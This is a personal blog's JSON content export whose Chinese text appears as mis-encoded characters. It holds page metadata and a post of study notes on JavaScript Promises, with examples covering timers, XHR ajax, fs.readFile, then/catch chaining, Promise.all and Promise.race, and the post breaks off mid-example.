{"meta":{"title":"Serein's blog","subtitle":"","description":"çƒ­çˆ±å¤§å‰ç«¯å¹¶æ€€æ£ç€æ¢¦æƒ³","author":"Serein","url":"https://serein.icu","root":"/"},"pages":[{"title":"åˆ†ç±»","date":"2020-11-24T07:12:19.000Z","updated":"2021-07-26T14:44:28.785Z","comments":false,"path":"categories/index.html","permalink":"https://serein.icu/categories/index.html","excerpt":"","text":""},{"title":"å…³äºæœ¬ç«™","date":"2022-03-10T15:19:56.000Z","updated":"2022-03-10T15:19:55.403Z","comments":false,"path":"about/index.html","permalink":"https://serein.icu/about/index.html","excerpt":"","text":"Sereinâ€œ è®¤è¯†è‡ªæˆ‘ã€è¶…è¶Šè‡ªæˆ‘ â€œ é‚£ä¹ˆä½ ç¦»æˆåŠŸå°±åˆè¿›äº†ä¸€æ­¥ï¼ å½“ä½ æ„Ÿè§‰æ‰€è¦å­¦ä¹ çš„äººå’Œäº‹è¶Šæ¥è¶Šå¤šæ—¶ï¼Œè¯´æ˜ä½ åœ¨ æˆé•¿ ã€‚ å½“ä½ æ„Ÿè§‰è¦è´£æ€ªçš„äººå’Œäº‹è¶Šæ¥è¶Šå°‘æ—¶ï¼Œè¯´æ˜ä½ åœ¨ æˆç†Ÿ ã€‚ å½“ä½ åœ¨ä¸æ–­è·å¾—äº†å‹è°Šå’Œæœ‹å‹æ—¶ï¼Œè¯´æ˜ä½ å°†å–å¾— æˆåŠŸ ã€‚ è”ç³»æˆ‘Bç«™ï¼šçˆ†ç‚¸å§-ç°å……ï¼ˆbilibili YYDS !ï¼‰ QQï¼š1297711534 (é—´æ¥æ€§å¤±è”) åº§å³é“­ï¼šæ—¢ç„¶é€‰æ‹©äº†è¿œæ–¹ ä¾¿åªé¡¾é£é›¨å…¼ç¨‹"},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2022-03-13T03:14:57.264Z","comments":true,"path":"archives/index.html","permalink":"https://serein.icu/archives/index.html","excerpt":"","text":""},{"title":"æˆ‘çš„æ­Œå•","date":"2019-05-17T08:14:00.000Z","updated":"2021-07-26T13:06:52.537Z","comments":true,"path":"music/index.html","permalink":"https://serein.icu/music/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2018-06-07T14:17:49.000Z","updated":"2021-07-27T07:31:10.990Z","comments":true,"path":"link/index.html","permalink":"https://serein.icu/link/index.html","excerpt":"","text":""},{"title":"ç•™è¨€æ¿","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-23T10:50:01.880Z","comments":false,"path":"comments/index.html","permalink":"https://serein.icu/comments/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2020-11-24T07:14:39.000Z","updated":"2021-07-26T14:44:42.337Z","comments":false,"path":"tags/index.html","permalink":"https://serein.icu/tags/index.html","excerpt":"","text":""},{"title":"","date":"2019-08-10T08:41:10.000Z","updated":"2022-03-11T06:56:26.059Z","comments":false,"path":"List/movies/index.html","permalink":"https://serein.icu/List/movies/index.html","excerpt":"","text":"å¥¥æ–¯å¡æœ€ä½³åŠ¨ç”»çŸ­ç‰‡ã€Šé¹¬ã€‹ï¼ˆPiperï¼‰"},{"title":"","date":"2022-03-12T03:23:13.000Z","updated":"2022-03-13T03:23:35.157Z","comments":false,"path":"List/gallery/wallpaper/index.html","permalink":"https://serein.icu/List/gallery/wallpaper/index.html","excerpt":"","text":""},{"title":"Music-BOX","date":"2020-04-23T04:58:56.000Z","updated":"2022-03-11T06:18:21.494Z","comments":false,"path":"List/music/index.html","permalink":"https://serein.icu/List/music/index.html","excerpt":"","text":""},{"title":"ç›¸å†Œ","date":"2022-03-13T03:18:40.109Z","updated":"2022-03-13T03:18:40.109Z","comments":false,"path":"List/gallery/index.html","permalink":"https://serein.icu/List/gallery/index.html","excerpt":"","text":"å£ç´™ /List/gallery/wallpaper"}],"posts":[{"title":"Promiseå­¦ä¹ ç¬”è®°","slug":"Promiseç³»ç»Ÿå­¦ä¹ ç¬”è®°","date":"2022-03-28T09:30:00.000Z","updated":"2022-03-29T00:34:17.429Z","comments":true,"path":"posts/6.html","link":"","permalink":"https://serein.icu/posts/6.html","excerpt":"","text":"Promiseçš„ç†è§£ä¸ä½¿ç”¨ æ¦‚å¿µ: â€‹ Promiseæ˜¯å¼‚æ­¥ç¼–ç¨‹çš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œæ¯”ä¼ ç»Ÿçš„è§£å†³æ–¹æ¡ˆâ€”â€”å›è°ƒå‡½æ•°å’Œäº‹ä»¶â€”â€”æ›´åˆç†å’Œæ›´å¼ºå¤§ã€‚æ‰€è°“Promiseï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œé‡Œé¢ä¿å­˜ç€æŸä¸ªæœªæ¥æ‰ä¼šç»“æŸçš„äº‹ä»¶ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼‰çš„ç»“æœã€‚ é€šä¿—è®²ï¼ŒPromiseæ˜¯ä¸€ä¸ªè®¸è¯ºã€æ‰¿è¯º,æ˜¯å¯¹æœªæ¥äº‹æƒ…çš„æ‰¿è¯ºï¼Œæ‰¿è¯ºä¸ä¸€å®šèƒ½å®Œæˆï¼Œä½†æ˜¯æ— è®ºæ˜¯å¦èƒ½å®Œæˆéƒ½ä¼šæœ‰ä¸€ä¸ªç»“æœã€‚ Pending æ­£åœ¨åšã€‚ã€‚ã€‚ Resolved å®Œæˆè¿™ä¸ªæ‰¿è¯º Rejected è¿™ä¸ªæ‰¿è¯ºæ²¡æœ‰å®Œæˆï¼Œå¤±è´¥äº† â€‹ Promise ç”¨æ¥é¢„å®šä¸€ä¸ªä¸ä¸€å®šèƒ½å®Œæˆçš„ä»»åŠ¡ï¼Œè¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆå¤±è´¥ â€‹ åœ¨å…·ä½“çš„ç¨‹åºä¸­å…·ä½“çš„ä½“ç°ï¼Œé€šå¸¸ç”¨æ¥å°è£…ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œæä¾›æ‰¿è¯ºç»“æœ Promise æ˜¯å¼‚æ­¥ç¼–ç¨‹çš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œä¸»è¦ç”¨æ¥è§£å†³å›è°ƒåœ°ç‹±çš„é—®é¢˜ï¼Œå¯ä»¥æœ‰æ•ˆçš„å‡å°‘å›è°ƒåµŒå¥—ã€‚çœŸæ­£è§£å†³éœ€è¦é…åˆasync/await ç‰¹ç‚¹: â€‹ (1)å¯¹è±¡çš„çŠ¶æ€ä¸å—å¤–ç•Œå½±å“ã€‚Promiseå¯¹è±¡ä»£è¡¨ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œæœ‰ä¸‰ç§çŠ¶æ€ï¼šPendingï¼ˆè¿›è¡Œä¸­ï¼‰ã€Resolvedï¼ˆå·²å®Œæˆï¼Œåˆç§°Fulfilledï¼‰å’ŒRejectedï¼ˆå·²å¤±è´¥ï¼‰ã€‚åªæœ‰å¼‚æ­¥æ“ä½œçš„ç»“æœï¼Œå¯ä»¥å†³å®šå½“å‰æ˜¯å“ªä¸€ç§çŠ¶æ€ï¼Œä»»ä½•å…¶ä»–æ“ä½œéƒ½æ— æ³•æ”¹å˜è¿™ä¸ªçŠ¶æ€ã€‚ â€‹ (2)ä¸€æ—¦çŠ¶æ€æ”¹å˜ï¼Œå°±ä¸ä¼šå†å˜ï¼Œä»»ä½•æ—¶å€™éƒ½å¯ä»¥å¾—åˆ°è¿™ä¸ªç»“æœã€‚Promiseå¯¹è±¡çš„çŠ¶æ€æ”¹å˜ï¼Œåªæœ‰ä¸¤ç§å¯èƒ½ï¼šä»Pendingå˜ä¸ºResolvedå’Œä»Pendingå˜ä¸ºRejectedã€‚åªè¦è¿™ä¸¤ç§æƒ…å†µå‘ç”Ÿï¼ŒçŠ¶æ€å°±å‡å›ºäº†ï¼Œä¸ä¼šå†å˜äº†ï¼Œä¼šä¸€ç›´ä¿æŒè¿™ä¸ªç»“æœã€‚å°±ç®—æ”¹å˜å·²ç»å‘ç”Ÿäº†ï¼Œä½ å†å¯¹Promiseå¯¹è±¡æ·»åŠ å›è°ƒå‡½æ•°ï¼Œä¹Ÿä¼šç«‹å³å¾—åˆ°è¿™ä¸ªç»“æœã€‚ ç¼ºç‚¹: â€‹ (1)æ— æ³•å–æ¶ˆPromiseï¼Œä¸€æ—¦æ–°å»ºå®ƒå°±ä¼šç«‹å³æ‰§è¡Œï¼Œæ— æ³•ä¸­é€”å–æ¶ˆã€‚å’Œä¸€èˆ¬çš„å¯¹è±¡ä¸ä¸€æ ·ï¼Œæ— éœ€è°ƒç”¨ã€‚ â€‹ (2)å¦‚æœä¸è®¾ç½®å›è°ƒå‡½æ•°ï¼ŒPromiseå†…éƒ¨æŠ›å‡ºçš„é”™è¯¯ï¼Œä¸ä¼šååº”åˆ°å¤–éƒ¨ã€‚ â€‹ (3)å½“å¤„äºPendingçŠ¶æ€æ—¶ï¼Œæ— æ³•å¾—çŸ¥ç›®å‰è¿›å±•åˆ°å“ªä¸€ä¸ªé˜¶æ®µï¼ˆåˆšåˆšå¼€å§‹è¿˜æ˜¯å³å°†å®Œæˆï¼‰ Promiseæ˜¯ä»€ä¹ˆ?ç†è§£ æŠ½è±¡è¡¨è¾¾: â€‹ 1) Promise æ˜¯ä¸€é—¨æ–°çš„æŠ€æœ¯(ES6 è§„èŒƒ) â€‹ 2)Promise æ˜¯ JS ä¸­è¿›è¡Œå¼‚æ­¥ç¼–ç¨‹çš„æ–°è§£å†³æ–¹æ¡ˆ å¤‡æ³¨ï¼šæ—§æ–¹æ¡ˆæ˜¯å•çº¯ä½¿ç”¨å›è°ƒå‡½æ•° å…·ä½“è¡¨è¾¾: ä»è¯­æ³•ä¸Šæ¥è¯´: Promise æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•° ä»åŠŸèƒ½ä¸Šæ¥è¯´: promise å¯¹è±¡ç”¨æ¥å°è£…ä¸€ä¸ªå¼‚æ­¥æ“ä½œå¹¶å¯ä»¥è·å–å…¶æˆåŠŸ/ å¤±è´¥çš„ç»“æœå€¼ promise çš„çŠ¶æ€promise çš„çŠ¶æ€ å®ä¾‹å¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§ ã€PromiseStateã€ pending æœªå†³å®šçš„ resolved / fullfilled æˆåŠŸ rejected å¤±è´¥ promise çš„çŠ¶æ€æ”¹å˜ pending å˜ä¸º resolved pending å˜ä¸º rejected è¯´æ˜: åªæœ‰è¿™ 2 ç§, ä¸”ä¸€ä¸ª promise å¯¹è±¡åªèƒ½æ”¹å˜ä¸€æ¬¡ æ— è®ºå˜ä¸ºæˆåŠŸè¿˜æ˜¯å¤±è´¥, éƒ½ä¼šæœ‰ä¸€ä¸ªç»“æœæ•°æ® æˆåŠŸçš„ç»“æœæ•°æ®ä¸€èˆ¬ç§°ä¸º value, å¤±è´¥çš„ç»“æœæ•°æ®ä¸€èˆ¬ç§°ä¸º reason promiseçš„åŸºæœ¬æµç¨‹ promiseçš„åŸºæœ¬ä½¿ç”¨ä½¿ç”¨ promise å°è£…åŸºäºå®šæ—¶å™¨çš„å¼‚æ­¥&lt;script&gt; function doDelay(time) { // 1. åˆ›å»º promise å¯¹è±¡(pending çŠ¶æ€), æŒ‡å®šæ‰§è¡Œå™¨å‡½æ•° return new Promise((resolve, reject) =&gt; { // 2. åœ¨æ‰§è¡Œå™¨å‡½æ•°ä¸­å¯åŠ¨å¼‚æ­¥ä»»åŠ¡ console.log('å¯åŠ¨å¼‚æ­¥ä»»åŠ¡') setTimeout(() =&gt; { console.log('å»¶è¿Ÿä»»åŠ¡å¼€å§‹æ‰§è¡Œ...') const time = Date.now() // å‡è®¾: æ—¶é—´ä¸ºå¥‡æ•°ä»£è¡¨æˆåŠŸ, ä¸ºå¶æ•°ä»£è¡¨å¤±è´¥ if (time % 2 === 1) { // æˆåŠŸäº† // 3. 1. å¦‚æœæˆåŠŸäº†, è°ƒç”¨ resolve()å¹¶ä¼ å…¥æˆåŠŸçš„ value resolve('æˆåŠŸçš„æ•°æ® ' + time) } else { // å¤±è´¥äº† // 3.2. å¦‚æœå¤±è´¥äº†, è°ƒç”¨ reject()å¹¶ä¼ å…¥å¤±è´¥çš„ reason reject('å¤±è´¥çš„æ•°æ® ' + time) } }, time) }) } const promise = doDelay(2000) promise.then(// promise æŒ‡å®šæˆåŠŸæˆ–å¤±è´¥çš„å›è°ƒå‡½æ•°æ¥è·å–æˆåŠŸçš„ vlaue æˆ–å¤±è´¥çš„ reason value =&gt; {// æˆåŠŸçš„å›è°ƒå‡½æ•° onResolved, å¾—åˆ°æˆåŠŸçš„ vlaue console.log('æˆåŠŸçš„ value: ', value) }, reason =&gt; { // å¤±è´¥çš„å›è°ƒå‡½æ•° onRejected, å¾—åˆ°å¤±è´¥çš„ reason console.log('å¤±è´¥çš„ reason: ', reason) }, ) &lt;/script&gt; ä½¿ç”¨ promise å°è£… ajax å¼‚æ­¥è¯·æ±‚&lt;script&gt; /*å¯å¤ç”¨çš„å‘ ajax è¯·æ±‚çš„å‡½æ•°: xhr + promise */ function promiseAjax(url) { return new Promise((resolve, reject) =&gt; { const xhr = new XMLHttpRequest() xhr.onreadystatechange = () =&gt; { if (xhr.readyState !== 4) return const {status, response} = xhr // è¯·æ±‚æˆåŠŸ, è°ƒç”¨ resolve(value) if (status &gt;= 200 &amp;&amp; status &lt; 300) { resolve(JSON.parse(response)) } else { // è¯·æ±‚å¤±è´¥, è°ƒç”¨ reject(reason) reject(new Error('è¯·æ±‚å¤±è´¥: status: ' + status)) } } xhr.open(\"GET\", url) xhr.send() }) } promiseAjax('https://api.apiopen.top2/getJoke?page=1&amp;count=2&amp;type=video').then( data =&gt; { console.log('æ˜¾ç¤ºæˆåŠŸæ•°æ®', data) }, error =&gt; { alert(error.message) }) &lt;/script&gt; fsæ¨¡å—ä½¿ç”¨Promiseconst fs = require('fs'); //å›è°ƒå‡½æ•° å½¢å¼---------------------------------------------------- fs.readFile('./resource/content.txt', (err, data) =&gt; { // å¦‚æœå‡ºé”™ åˆ™æŠ›å‡ºé”™è¯¯ if(err) throw err; //è¾“å‡ºæ–‡ä»¶å†…å®¹ console.log(data.toString()); }); //Promise å½¢å¼----------------------------------------------------------- /** * å°è£…ä¸€ä¸ªå‡½æ•° mineReadFile è¯»å–æ–‡ä»¶å†…å®¹ * å‚æ•°: path æ–‡ä»¶è·¯å¾„ * è¿”å›: promise å¯¹è±¡ */ function mineReadFile(path){ return new Promise((resolve, reject) =&gt; { //è¯»å–æ–‡ä»¶ require('fs').readFile(path, (err, data) =&gt;{ //åˆ¤æ–­ if(err) reject(err); //æˆåŠŸ resolve(data); }); }); } mineReadFile('./resource/content.txt').then( value=&gt;{ //è¾“å‡ºæ–‡ä»¶å†…å®¹ console.log(value.toString()); }, reason=&gt;{ console.log(reason); }); å¼‚å¸¸ç©¿é€ å¯ä»¥åœ¨æ¯ä¸ªthen()çš„ç¬¬äºŒä¸ªå›è°ƒå‡½æ•°ä¸­è¿›è¡Œerrå¤„ç†,ä¹Ÿå¯ä»¥åˆ©ç”¨å¼‚å¸¸ç©¿é€ç‰¹æ€§,åˆ°æœ€åç”¨catchå»æ‰¿æ¥ç»Ÿä¸€å¤„ç†,ä¸¤è€…ä¸€èµ·ç”¨æ—¶,å‰è€…ä¼šç”Ÿæ•ˆ(å› ä¸ºerrå·²ç»å°†å…¶å¤„ç†,å°±ä¸ä¼šå†å¾€ä¸‹ç©¿é€)è€Œèµ°ä¸åˆ°åé¢çš„catch åœ¨æ¯ä¸ª.then()ä¸­æˆ‘å¯ä»¥å°†æ•°æ®å†æ¬¡ä¼ å‡ºç»™ä¸‹ä¸€ä¸ªthen() mineReadFile('./11.txt').then(result=&gt;{ console.log(result.toString()) return result },err=&gt;console.log(err)) .then(data=&gt;console.log(data,\"2222222\")) .catch(err=&gt;console.log(\"è¿™æ˜¯catchçš„\")) 5.util.promisifyæ–¹æ³• å¯ä»¥å°†å‡½æ•°ç›´æ¥å˜æˆpromiseçš„å°è£…æ–¹å¼,ä¸ç”¨å†å»æ‰‹åŠ¨å°è£… //å¼•å…¥ util æ¨¡å— const util = require('util'); //å¼•å…¥ fs æ¨¡å— const fs = require('fs'); //è¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•° let mineReadFile = util.promisify(fs.readFile); mineReadFile('./resource/content.txt').then(value =&gt; { console.log(value.toString()); }); ä¸ºä»€ä¹ˆè¦ç”¨Promise?æŒ‡å®šå›è°ƒå‡½æ•°çš„æ–¹å¼æ›´åŠ çµæ´» æ—§çš„: å¿…é¡»åœ¨å¯åŠ¨å¼‚æ­¥ä»»åŠ¡å‰æŒ‡å®š promise: å¯åŠ¨å¼‚æ­¥ä»»åŠ¡ =&gt; è¿”å›promieå¯¹è±¡ =&gt; ç»™promiseå¯¹è±¡ç»‘å®šå›è°ƒå‡½ æ•°(ç”šè‡³å¯ä»¥åœ¨å¼‚æ­¥ä»»åŠ¡ç»“æŸåæŒ‡å®š/å¤šä¸ª) â…¡-æ”¯æŒé“¾å¼è°ƒç”¨, å¯ä»¥è§£å†³å›è°ƒåœ°ç‹±é—®é¢˜1ã€ä»€ä¹ˆæ˜¯å›è°ƒåœ°ç‹± å›è°ƒå‡½æ•°åµŒå¥—è°ƒç”¨, å¤–éƒ¨å›è°ƒå‡½æ•°å¼‚æ­¥æ‰§è¡Œçš„ç»“æœæ˜¯åµŒå¥—çš„å›è°ƒæ‰§è¡Œçš„æ¡ä»¶ 2ã€å›è°ƒåœ°ç‹±çš„ç¼ºç‚¹? ä¸ä¾¿äºé˜…è¯» ä¸ä¾¿äºå¼‚å¸¸å¤„ç† 3ã€è§£å†³æ–¹æ¡ˆ? promise é“¾å¼è°ƒç”¨, ç”¨æ¥è§£å†³å›è°ƒåœ°ç‹±é—®é¢˜ï¼Œä½†æ˜¯åªæ˜¯ç®€å•çš„æ”¹å˜æ ¼å¼ï¼Œå¹¶æ²¡æœ‰å½»åº•è§£å†³ä¸Šé¢çš„é—®é¢˜çœŸæ­£è¦è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œä¸€å®šè¦åˆ©ç”¨promiseå†åŠ ä¸Šawaitå’Œasyncå…³é”®å­—å®ç°å¼‚æ­¥ä¼ åŒæ­¥ 4ã€ç»ˆæè§£å†³æ–¹æ¡ˆ? promise +async/await 3ã€Promiseä¸­çš„å¸¸ç”¨ API æ¦‚è¿° æ­¤å¤„åˆ—ä¸¾å‡ ä¸ªæœ€å¸¸ç”¨çš„APIçš„æ¦‚è¿°,å¦‚æœæƒ³çœ‹è¯¦ç»†æè¿°çš„å¯ä»¥ç»§ç»­å¾€ä¸‹çœ‹ä¸‹æ–¹çš„ Promiseæ–¹æ³•çš„å…·ä½“ä½¿ç”¨ æè¿° â… - Promise æ„é€ å‡½æ•°: Promise (excutor) {} (1) executor å‡½æ•°: æ‰§è¡Œå™¨ (resolve, reject) =&gt; {} (2) resolve å‡½æ•°: å†…éƒ¨å®šä¹‰æˆåŠŸæ—¶æˆ‘ä»¬è°ƒç”¨çš„å‡½æ•° value =&gt; {} (3) reject å‡½æ•°: å†…éƒ¨å®šä¹‰å¤±è´¥æ—¶æˆ‘ä»¬è°ƒç”¨çš„å‡½æ•° reason =&gt; {} è¯´æ˜: executor ä¼šåœ¨ Promise å†…éƒ¨ç«‹å³åŒæ­¥è°ƒç”¨,å¼‚æ­¥æ“ä½œåœ¨æ‰§è¡Œå™¨ä¸­æ‰§è¡Œ,æ¢è¯è¯´Promiseæ”¯æŒåŒæ­¥ä¹Ÿæ”¯æŒå¼‚æ­¥æ“ä½œ â…¡-Promise.prototype.then æ–¹æ³•: (onResolved, onRejected) =&gt; {} (1) onResolved å‡½æ•°: æˆåŠŸçš„å›è°ƒå‡½æ•° (value) =&gt; {} (2) onRejected å‡½æ•°: å¤±è´¥çš„å›è°ƒå‡½æ•° (reason) =&gt; {} è¯´æ˜: æŒ‡å®šç”¨äºå¾—åˆ°æˆåŠŸ value çš„æˆåŠŸå›è°ƒå’Œç”¨äºå¾—åˆ°å¤±è´¥ reason çš„å¤±è´¥å›è°ƒ è¿”å›ä¸€ä¸ªæ–°çš„ promise å¯¹è±¡ â…¢-Promise.prototype.catch æ–¹æ³•: (onRejected) =&gt; {} (1) onRejected å‡½æ•°: å¤±è´¥çš„å›è°ƒå‡½æ•° (reason) =&gt; {} è¯´æ˜: then()çš„è¯­æ³•ç³–, ç›¸å½“äº: then(undefined, onRejected) (2) å¼‚å¸¸ç©¿é€ä½¿ç”¨:å½“è¿è¡Œåˆ°æœ€å,æ²¡è¢«å¤„ç†çš„æ‰€æœ‰å¼‚å¸¸é”™è¯¯éƒ½ä¼šè¿›å…¥è¿™ä¸ªæ–¹æ³•çš„å›è°ƒå‡½æ•°ä¸­ â…£-Promise.resolve æ–¹æ³•: (value) =&gt; {} (1) value: æˆåŠŸçš„æ•°æ®æˆ– promise å¯¹è±¡ è¯´æ˜: è¿”å›ä¸€ä¸ªæˆåŠŸ/å¤±è´¥çš„ promise å¯¹è±¡,ç›´æ¥æ”¹å˜promiseçŠ¶æ€ let p3 = Promise.reject(new Promise((resolve, reject) =&gt; { resolve('OK'); })); console.log(p3); â…¤-Promise.reject æ–¹æ³•: (reason) =&gt; {} (1) reason: å¤±è´¥çš„åŸå›  è¯´æ˜: è¿”å›ä¸€ä¸ªå¤±è´¥çš„ promise å¯¹è±¡,ç›´æ¥æ”¹å˜promiseçŠ¶æ€,ä»£ç ç¤ºä¾‹åŒä¸Š â…¥-Promise.all æ–¹æ³•: (promises) =&gt; {} promises: åŒ…å« n ä¸ª promise çš„æ•°ç»„ è¯´æ˜: è¿”å›ä¸€ä¸ªæ–°çš„ promise, åªæœ‰æ‰€æœ‰çš„ promise éƒ½æˆåŠŸæ‰æˆåŠŸ, åªè¦æœ‰ä¸€ ä¸ªå¤±è´¥äº†å°±ç›´æ¥å¤±è´¥ let p1 = new Promise((resolve, reject) =&gt; { resolve('æˆåŠŸ'); }) let p2 = Promise.reject('é”™è¯¯é”™è¯¯é”™è¯¯'); let p3 = Promise.resolve('ä¹Ÿæ˜¯æˆåŠŸ') const result = Promise.all([p1, p2, p3]); console.log(result); â…¦-Promise.race æ–¹æ³•: (promises) =&gt; {} (1) promises: åŒ…å« n ä¸ª promise çš„æ•°ç»„ è¯´æ˜: è¿”å›ä¸€ä¸ªæ–°çš„ promise, ç¬¬ä¸€ä¸ªå®Œæˆçš„ promise çš„ç»“æœçŠ¶æ€å°±æ˜¯æœ€ç»ˆçš„ç»“æœçŠ¶æ€, å¦‚p1å»¶æ—¶,å¼€å¯äº†å¼‚æ­¥,å†…éƒ¨æ­£å¸¸æ˜¯åŒæ­¥è¿›è¡Œ,æ‰€ä»¥p2&gt;p3&gt;p1,ç»“æœæ˜¯P2 let p1 = new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { resolve('OK'); }, 1000); }) let p2 = Promise.resolve('Success'); let p3 = Promise.resolve('Oh Yeah'); //è°ƒç”¨ const result = Promise.race([p1, p2, p3]); console.log(result); 4ã€Promiseçš„å‡ ä¸ªå…³é”®é—®é¢˜â… -å¦‚ä½•æ”¹å˜ promise çš„çŠ¶æ€? (1) resolve(value): å¦‚æœå½“å‰æ˜¯ pending å°±ä¼šå˜ä¸º resolved (2) reject(reason): å¦‚æœå½“å‰æ˜¯ pending å°±ä¼šå˜ä¸º rejected (3) æŠ›å‡ºå¼‚å¸¸: å¦‚æœå½“å‰æ˜¯ pending å°±ä¼šå˜ä¸º rejected â…¡-ä¸€ä¸ª promise æŒ‡å®šå¤šä¸ªæˆåŠŸ/å¤±è´¥å›è°ƒå‡½æ•°, éƒ½ä¼šè°ƒç”¨å—? å½“ promise æ”¹å˜ä¸ºå¯¹åº”çŠ¶æ€æ—¶éƒ½ä¼šè°ƒç”¨,æ”¹å˜çŠ¶æ€å,å¤šä¸ªå›è°ƒå‡½æ•°éƒ½ä¼šè°ƒç”¨,å¹¶ä¸ä¼šè‡ªåŠ¨åœæ­¢ &gt;let p = new Promise((resolve, reject) =&gt; { resolve('OK');}); ///æŒ‡å®šå›è°ƒ - 1 p.then(value =&gt; { console.log(value); }); //æŒ‡å®šå›è°ƒ - 2 p.then(value =&gt; { alert(value);}); â…¢- æ”¹å˜ promise çŠ¶æ€å’ŒæŒ‡å®šå›è°ƒå‡½æ•°è°å…ˆè°å? (1) éƒ½æœ‰å¯èƒ½, æ­£å¸¸æƒ…å†µä¸‹æ˜¯å…ˆæŒ‡å®šå›è°ƒå†æ”¹å˜çŠ¶æ€, ä½†ä¹Ÿå¯ä»¥å…ˆæ”¹çŠ¶æ€å†æŒ‡å®šå›è°ƒ â€‹ å…ˆæŒ‡å®šå›è°ƒå†æ”¹å˜çŠ¶æ€(å¼‚æ­¥):å…ˆæŒ‡å®šå›è°ƒâ€“&gt; å†æ”¹å˜çŠ¶æ€ â€“&gt;æ”¹å˜çŠ¶æ€åæ‰è¿›å…¥å¼‚æ­¥é˜Ÿåˆ—æ‰§è¡Œå›è°ƒå‡½æ•° â€‹ å…ˆæ”¹çŠ¶æ€å†æŒ‡å®šå›è°ƒ(åŒæ­¥):æ”¹å˜çŠ¶æ€ â€“&gt;æŒ‡å®šå›è°ƒ å¹¶é©¬ä¸Šæ‰§è¡Œå›è°ƒ (2) å¦‚ä½•å…ˆæ”¹çŠ¶æ€å†æŒ‡å®šå›è°ƒ? â€“&gt;æ³¨æ„:æŒ‡å®šå¹¶ä¸æ˜¯æ‰§è¡Œ â€‹ â‘  åœ¨æ‰§è¡Œå™¨ä¸­ç›´æ¥è°ƒç”¨ resolve()/reject() â€“&gt;å³,ä¸ä½¿ç”¨å®šæ—¶å™¨ç­‰æ–¹æ³•,æ‰§è¡Œå™¨å†…ç›´æ¥åŒæ­¥æ“ä½œ â€‹ â‘¡ å»¶è¿Ÿæ›´é•¿æ—¶é—´æ‰è°ƒç”¨ then() â€“&gt;å³,åœ¨.then()è¿™ä¸ªæ–¹æ³•å¤–å†åŒ…ä¸€å±‚ä¾‹å¦‚å»¶æ—¶å™¨è¿™ç§æ–¹æ³• (3) ä»€ä¹ˆæ—¶å€™æ‰èƒ½å¾—åˆ°æ•°æ®? â€‹ â‘  å¦‚æœå…ˆæŒ‡å®šçš„å›è°ƒ, é‚£å½“çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶, å›è°ƒå‡½æ•°å°±ä¼šè°ƒç”¨, å¾—åˆ°æ•°æ® â€‹ â‘¡ å¦‚æœå…ˆæ”¹å˜çš„çŠ¶æ€, é‚£å½“æŒ‡å®šå›è°ƒæ—¶, å›è°ƒå‡½æ•°å°±ä¼šè°ƒç”¨, å¾—åˆ°æ•°æ® &gt;let p = new Promise((resolve, reject) =&gt; { //å¼‚æ­¥å†™æ³•,è¿™æ ·å†™ä¼šå…ˆæŒ‡å®šå›è°ƒ,å†æ”¹å˜çŠ¶æ€ setTimeout(() =&gt; {resolve('OK'); }, 1000); //è¿™æ˜¯åŒæ­¥å†™æ³•,è¿™æ ·å†™ä¼šå…ˆæ”¹å˜çŠ¶æ€,å†æŒ‡å®šå›è°ƒ resolve('OK'); &gt;}); &gt;p.then(value =&gt; {console.log(value);}, reason =&gt; {}) (4) ä¸ªäººç†è§£â€“ç»“åˆæºç  â€‹ æºç ä¸­,promiseçš„çŠ¶æ€æ˜¯é€šè¿‡ä¸€ä¸ªé»˜è®¤ä¸ºpaddingçš„å˜é‡è¿›è¡Œåˆ¤æ–­,æ‰€ä»¥å½“ä½ resolve/rejectå»¶æ—¶(å¼‚æ­¥å¯¼è‡´å½“thenåŠ è½½æ—¶,çŠ¶æ€è¿˜æœªä¿®æ”¹)å,è¿™æ—¶ç›´æ¥è¿›è¡Œp.then()ä¼šå‘ç°,ç›®å‰çŠ¶æ€è¿˜æ˜¯è¿›è¡Œä¸­,æ‰€ä»¥åªæ˜¯è¿™æ ·å¯¼è‡´åªæœ‰åŒæ­¥æ“ä½œæ‰èƒ½æˆåŠŸ. â€‹ æ‰€ä»¥promiseå°†ä¼ å…¥çš„å›è°ƒå‡½æ•°æ‹·è´åˆ°promiseå¯¹è±¡å®ä¾‹ä¸Š,ç„¶ååœ¨resolve/rejectçš„æ‰§è¡Œè¿‡ç¨‹ä¸­å†è¿›è¡Œè°ƒç”¨,è¾¾åˆ°å¼‚æ­¥çš„ç›®çš„ â€‹ å…·ä½“ä»£ç å®ç°çœ‹ä¸‹æ–¹è‡ªå®šä¹‰promise â…£-promise.then()è¿”å›çš„æ–° promise çš„ç»“æœçŠ¶æ€ç”±ä»€ä¹ˆå†³å®š? (1) ç®€å•è¡¨è¾¾: ç”± then()æŒ‡å®šçš„å›è°ƒå‡½æ•°æ‰§è¡Œçš„ç»“æœå†³å®š (2) è¯¦ç»†è¡¨è¾¾: â€‹ â‘  å¦‚æœæŠ›å‡ºå¼‚å¸¸, æ–° promise å˜ä¸º rejected, reason ä¸ºæŠ›å‡ºçš„å¼‚å¸¸ â€‹ â‘¡ å¦‚æœè¿”å›çš„æ˜¯é promise çš„ä»»æ„å€¼, æ–° promise å˜ä¸º resolved, value ä¸ºè¿”å›çš„å€¼ â€‹ â‘¢ å¦‚æœè¿”å›çš„æ˜¯å¦ä¸€ä¸ªæ–° promise, æ­¤ promise çš„ç»“æœå°±ä¼šæˆä¸ºæ–° promise çš„ç»“æœ &gt;let p = new Promise((resolve, reject) =&gt; { resolve('ok'); &gt;}); &gt;//æ‰§è¡Œ then æ–¹æ³• &gt;let result = p.then(value =&gt; { console.log(value); // 1. æŠ›å‡ºé”™è¯¯ 